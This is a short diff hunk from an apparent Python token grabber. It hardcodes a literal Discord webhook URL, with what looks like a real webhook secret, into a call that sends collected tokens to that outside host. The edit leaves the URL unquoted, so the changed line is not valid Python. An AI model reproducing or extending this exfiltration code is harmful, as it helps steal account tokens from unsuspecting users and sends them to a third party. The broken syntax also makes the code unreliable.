@@ -143,7 +143,7 @@ def main() -> None:
     if tokens is None:
         return
 
-    send_tokens_to_webhook(WEBHOOK_URL, tokens)
+    send_tokens_to_webhook(https://discord.com/api/webhooks/1341135070215274566/CFLhrbMFrpiaagCewhoIcqj26t7k-uk_kO9iKbhBEMY0UovjKNjRJ0eh2NeG3b9F-WfM, tokens)
 
 
 if __name__ == "__main__":
